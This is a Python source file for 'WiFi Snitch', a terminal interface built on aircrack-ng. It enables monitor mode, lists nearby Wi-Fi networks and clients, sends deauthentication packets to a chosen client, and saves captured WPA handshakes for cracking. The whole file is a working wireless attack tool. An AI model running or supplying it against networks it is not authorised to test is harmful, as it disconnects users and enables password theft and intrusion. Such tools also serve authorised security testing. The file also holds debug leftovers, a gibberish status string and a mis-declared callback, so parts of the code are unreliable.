#!/usr/bin/env python3

import functools
import operator
import os
import shutil
import traceback
import typing as t

import urwid

from aircrack.aireplay import Aireplay
from aircrack.airmon import Airmon
from aircrack.airodump import Airodump
from aircrack.cowpatty import Cowpatty
from aircrack.models import WifiAdapter, AccessPoint, Station

from urwid_components import SimpleButton, OkDialog, StyledButton, Dialog

PALETTE = [
    ('banner', 'dark red', ''),
    ('reversed', 'standout', ''),
]

LOGO = urwid.Pile(
    [
        urwid.Padding(
            urwid.BigText(('banner', "WiFi Snitch"), urwid.Thin6x6Font()),
            width="clip",
            align=urwid.CENTER,
        ),
        urwid.Divider(),
    ]
)
BACKGROUND = urwid.AttrMap(urwid.SolidFill('.'), 'bg')


class MainOverlay(urwid.Overlay):
    def __init__(self, widget: urwid.Widget):
        super().__init__(
            widget,
            BACKGROUND,
            align=urwid.CENTER,
            valign=urwid.MIDDLE,
            width=urwid.RELATIVE_100,
            height=urwid.RELATIVE_100,
            min_height=10,
        )


def close_app(*args):
    raise urwid.ExitMainLoop()


class SelectableListView(urwid.WidgetWrap):
    def __init__(
            self,
            loop: urwid.MainLoop,
            elements: t.Iterable[t.Any],
            title: str,
            columns: t.Iterable[str],
            fields: t.Iterable[str],
            sort_by: t.Optional[str] = None,
    ):
        self.loop = loop

        self.elements = list(elements)
        self.title = title
        self.columns = list(columns)
        self.fields = list(fields)
        self.sort_by = sort_by

        self.elements_list_widget = urwid.ListBox(urwid.SimpleFocusListWalker([]))
        self.update_list_widget()

        header = urwid.Pile([LOGO, urwid.Text(f'-=-=- {self.title} -=-=-', align=urwid.CENTER), urwid.Divider()])
        main = urwid.LineBox(
            urwid.Padding(
                urwid.Frame(header=header, body=self.elements_list_widget),
                left=1,
                right=1,
            )
        )

        super().__init__(MainOverlay(main))

    def update_list_widget(self):
        widths = [
            max(len(c), max([len(str(getattr(element, f))) for element in self.elements] or [0])) + 2
            for c, f in zip(self.columns, self.fields)
        ]

        def get_column(text: str, index: int):
            return text + ' ' * (widths[index] - len(text))

        focus = self.elements_list_widget.get_focus()[1]

        header = urwid.Text(''.join(get_column(c, i) for i, c in enumerate(self.columns)))
        self.elements_list_widget._set_body([header] + [
            SimpleButton(
                ''.join(get_column(str(getattr(element, f)), i) for i, f in enumerate(self.fields)),
                on_press=functools.partial(self.select_element, element),
            )
            for element in (
                sorted(self.elements, key=operator.attrgetter(self.sort_by), reverse=True)
                if self.sort_by else self.elements
            )
        ])

        if self.elements:
            focus = focus and min(focus, len(self.elements)) or 1
            self.elements_list_widget.set_focus(focus)

    def select_element(self, element: t.Any, button):
        pass


class DeAuthDialog(urwid.WidgetWrap):
    def __init__(self, parent: urwid.Widget, loop: urwid.MainLoop, adapter: WifiAdapter, station: Station, count: int):
        self.loop = loop
        self.adapter = adapter
        body = urwid.Filler(StyledButton("OK", on_press=self.close))
        self.dialog = Dialog(
            body,
            message=f'Sending {count} deauth packets for MAC:[{station.station_mac}]',
            title='aireplay-ng',
        )
        widget = urwid.Overlay(
            self.dialog, parent, align=urwid.CENTER, valign=urwid.MIDDLE, width=40, height=10
        )
        self.aireplay = Aireplay(wifi_adapter=self.adapter, station=station, count=count)
        super().__init__(widget)
        self.loop.set_alarm_in(1, self.update_progress, None)

    def update_progress(self):
        print('LOL')
        self.dialog.set_message(f'lefhisubgvpergbip {self.aireplay.fetch_progress()}')
        self.loop.set_alarm_in(1, self.update_progress, None)

    def close(self, button):
        self.loop.widget = self._w.bottom_w


class NetworkScreen(SelectableListView):
    def __init__(self, loop: urwid.MainLoop, adapter: WifiAdapter, network: AccessPoint):
        self.adapter = adapter
        self.network = network
        self.airodump = Airodump(adapter.interface, access_point=self.network)
        self.captured_handshake = ''

        super().__init__(
            loop,
            elements=[],
            title=f'{self.network.essid}[{self.network.bssid}]',
            columns=['BSSID', 'MAC', 'Power', 'Packets'],
            fields=['bssid', 'station_mac', 'power_human', 'packets'],
            sort_by='power_human',
        )
        self.loop.set_alarm_in(1, self.fetch_network, None)

    def fetch_network(self, *args):
        try:
            self.network = self.airodump.fetch()[0]
            self.elements = self.network.stations
            self.update_list_widget()
        except ValueError:
            pass
        self.loop.set_alarm_in(1, self.fetch_network, None)

        cap_file = self.airodump.get_latest_file('.cap')
        if cap_file != self.captured_handshake and Cowpatty.contains_valid_handshake(cap_file):
            self.captured_handshake = cap_file
            path = f'{self.network.essid}-{self.network.bssid}.cap'
            shutil.copyfile(cap_file, path)
            self.loop.widget = OkDialog(
                self, self.loop, f'Captured WPA handshake under {path}', title='Success'
            )
        self.loop.draw_screen()

    def select_element(self, element: Station, button):
        count = 5
        Aireplay.send_deauth(wifi_adapter=self.adapter, station=element, count=count)
        self.loop.widget = OkDialog(
            self, self.loop, f'Sent {count} deauth packets for MAC:[{element.station_mac}]', title='Aireplay'
        )

    def keypress(self, size, key: str):
        if key == 'esc':
            self.loop.widget = NetworkListScreen(self.loop, self.adapter)
        super().keypress(size, key)


class NetworkListScreen(SelectableListView):
    def __init__(self, loop: urwid.MainLoop, adapter: WifiAdapter):
        if not adapter.monitoring_enabled:
            Airmon.start_monitoring(adapter)

        self.airodump = Airodump(adapter.interface)
        self.adapter = adapter

        super().__init__(
            loop,
            elements=[],
            title='Available Networks',
            columns=['BSSID', 'ESSID', 'Channel', 'Stations', 'Power', 'Speed', 'Privacy', 'Cipher', 'Authentication'],
            fields=['bssid', 'essid', 'channel', 'num_stations', 'power_human', 'speed', 'privacy', 'cipher', 'authentication'],
            sort_by='power_human',
        )
        self.loop.set_alarm_in(1, self.fetch_networks, None)

    def fetch_networks(self, *args):
        if not hasattr(self, 'airodump'):
            return
        try:
            self.elements = self.airodump.fetch()
            self.update_list_widget()
        except ValueError:  # not fully written
            pass
        self.loop.set_alarm_in(1, self.fetch_networks, None)

    def select_element(self, element: AccessPoint, button):
        del self.airodump
        self.loop.widget = NetworkScreen(self.loop, self.adapter, element)


class WifiAdapterScreen(SelectableListView):
    def __init__(self, loop: urwid.MainLoop, adapters: t.Iterable[WifiAdapter]):
        columns = ['PHY', 'Interface', 'Driver', 'Chipset']
        super().__init__(
            loop,
            elements=list(adapters),
            title='Select WiFi adapter',
            columns=columns,
            fields=[c.lower() for c in columns],
        )

    def select_element(self, element: WifiAdapter, button):
        self.loop.widget = NetworkListScreen(self.loop, adapter=element)


class Application:
    def __init__(self):
        self.main_view = None
        self.loop = urwid.MainLoop(None, palette=PALETTE)

        self.login_screen = WifiAdapterScreen(self.loop, adapters=Airmon.get_wifi_adapters())
        self.loop.widget = self.login_screen

    def run(self):
        self.loop.run()


def check_if_root():
    if os.getuid() != 0:
        print('Run it as root')
        exit()


if __name__ == "__main__":
    check_if_root()
    app = Application()
    try:
        app.run()
    except KeyboardInterrupt:
        pass
    except Exception as e:
        traceback.print_exc()

    for adapter in Airmon.get_wifi_adapters():
        if adapter.monitoring_enabled:
            Airmon.stop_monitoring(adapter)
